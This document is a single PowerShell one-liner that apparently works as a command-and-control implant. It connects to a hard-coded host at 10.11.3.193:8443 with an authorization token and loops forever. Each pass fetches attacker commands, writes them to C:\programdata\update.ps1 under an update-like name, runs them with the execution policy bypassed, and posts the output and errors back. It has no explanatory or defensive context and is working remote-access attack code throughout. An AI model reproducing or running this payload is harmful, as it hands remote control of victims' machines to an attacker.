$s='10.11.3.193:8443';$i='25459323-569dfedf-cd151b08';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/25459323 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/569dfedf -Headers @{"Authorization"=$i});if ($c -ne 'None') {echo "$c" | out-file -filepath C:\programdata\update.ps1;$r=powershell -ep bypass C:\programdata\update.ps1 -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/cd151b08 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}